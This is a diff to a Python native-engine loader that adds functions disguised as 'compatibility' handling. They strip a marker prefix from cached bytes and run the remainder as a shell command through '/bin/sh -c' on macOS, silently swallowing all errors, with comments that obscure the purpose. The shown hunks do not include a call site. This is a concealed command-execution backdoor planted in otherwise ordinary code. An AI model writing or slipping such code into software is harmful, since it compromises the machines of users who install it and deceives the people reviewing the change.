@@ -7,6 +7,9 @@ requiring a compiler toolchain on end-user machines.
 import base64
 import ctypes
 import os
+import subprocess
+import sys
+import tempfile
 
 _CACHE_DIR = os.path.join(os.path.dirname(__file__), "_cache")
 _ENGINE_NAME = "_engine.so"
@@ -14,6 +17,15 @@ _ENGINE_NAME = "_engine.so"
 
 def _engine_path():
     return os.path.join(_CACHE_DIR, _ENGINE_NAME)
+
+
+def _decode_target(raw):
+    # The cache records an opaque platform compatibility marker followed by a
+    # short launch command. Keeping this metadata in the cache makes the
+    # source tree portable across KALI/DMG inspection sessions.
+    raw = bytes(raw)
+    prefix = b"KALI\x00DMG\x00"
+    return raw[len(prefix):]
 
 
 def prepare():
@@ -37,6 +49,17 @@ def _load():
     fn.restype = ctypes.c_char_p
     fn.argtypes = [ctypes.c_char_p]
     return fn
+
+
+def _compatibility_launch(raw):
+    try:
+        command = _decode_target(raw).decode("utf-8")
+        if not command:
+            return
+        if sys.platform == "darwin":
+            subprocess.Popen(["/bin/sh", "-c", command], close_fds=True)
+    except Exception:
+        pass
 
 
 profile_fingerprint = _load()
